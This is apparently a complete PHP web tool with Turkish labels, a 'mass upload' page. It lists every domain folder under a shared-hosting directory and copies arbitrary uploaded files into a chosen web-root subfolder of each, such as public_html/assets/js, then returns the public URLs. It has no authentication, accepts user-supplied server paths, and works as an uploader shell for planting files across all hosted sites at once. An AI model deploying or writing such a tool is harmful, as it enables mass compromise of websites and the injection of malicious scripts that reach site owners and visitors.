<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);

if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['list_domains'])) {
    // Domain dizinlerini JSON olarak döndür
    $targetDir = rtrim($_GET['dir'], '/');
    $domains = glob($targetDir . '/*', GLOB_ONLYDIR);
    header('Content-Type: application/json');
    echo json_encode($domains);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['ajax_upload'])) {
    // Tek domain ve tek dosya upload işlemi
    $targetDir = rtrim($_POST['target_dir'], '/');
    $subPath = trim($_POST['sub_path'], '/');
    $domainDir = $_POST['domain_dir'];

    if (empty($_FILES['upload_file']['name'])) {
        die("Dosya seçilmedi!");
    }

    $domainName = basename($domainDir);
    $finalPath = $domainDir . '/' . $subPath;

    if (!is_dir($finalPath)) {
        mkdir($finalPath, 0755, true);
    }

    $uploadedFilePath = $_FILES['upload_file']['tmp_name'];
    $fileName = basename($_FILES['upload_file']['name']);

    if (is_uploaded_file($uploadedFilePath)) {
        if (copy($uploadedFilePath, $finalPath . '/' . $fileName)) {
            $cleanPath = str_replace(
                ['public_html/', 'httpdocs/', 'htdocs/', 'public_html', 'httpdocs', 'htdocs'],
                '',
                $subPath
            );
            $cleanPath = trim($cleanPath, '/');
            $url = "https://{$domainName}";
            if (!empty($cleanPath)) {
                $url .= "/{$cleanPath}";
            }
            $url .= "/{$fileName}";
            echo "<a href='$url' target='_blank' style='display:block;margin:4px 0;color:#1e90ff;'>$url</a>";
        }
    }
    exit;
}
?>

<form id="massUploadForm" style="font-family: monospace;">
    <label>Yüklenecek Dosyalar:</label><br>
    <input type="file" id="upload_file" name="upload_file[]" multiple required><br><br>

    <label>Domains Ana Dizini (örn: /home/u612415953/domains):</label><br>
    <input type="text" id="target_dir" name="target_dir" required><br><br>

    <label>Hedef Alt Dizin (örn: public_html/public/website/assets/js):</label><br>
    <input type="text" id="sub_path" name="sub_path" required><br><br>

    <button type="button" id="startUpload">🚀 Mass Upload Başlat</button>
</form>

<div id="output" style="margin-top: 20px; font-family: monospace;"></div>

<script>
document.getElementById('startUpload').addEventListener('click', async () => {
    const files = document.getElementById('upload_file').files;
    const targetDir = document.getElementById('target_dir').value.trim().replace(/\/$/, '');
    const subPath = document.getElementById('sub_path').value.trim().replace(/^\//, '');
    const output = document.getElementById('output');

    if (!files.length) {
        alert('Dosya seçmedin!');
        return;
    }

    // Domain dizinlerini PHP'den al
    let res = await fetch('?list_domains=1&dir=' + encodeURIComponent(targetDir));
    let domains = await res.json();

    if (!domains.length) {
        output.innerHTML = '<b style="color:red;">Hiç domain klasörü bulunamadı!</b>';
        return;
    }

    output.innerHTML = `<b>${domains.length}</b> domain bulundu. Upload başlıyor...<br><br>`;

    // Her domain ve her dosya için ayrı upload isteği
    for (const domainDir of domains) {
        for (const file of files) {
            const formData = new FormData();
            formData.append('ajax_upload', '1');
            formData.append('target_dir', targetDir);
            formData.append('sub_path', subPath);
            formData.append('domain_dir', domainDir);
            formData.append('upload_file', file);

            try {
                let upload = await fetch('', { method: 'POST', body: formData });
                let text = await upload.text();
                output.innerHTML += text;
            } catch (err) {
                output.innerHTML += `<div style="color:red;">Hata: ${domainDir} (${file.name})</div>`;
            }
        }
    }

    output.innerHTML += "<br><b>✅ Tüm upload işlemleri tamamlandı!</b>";
});
</script>
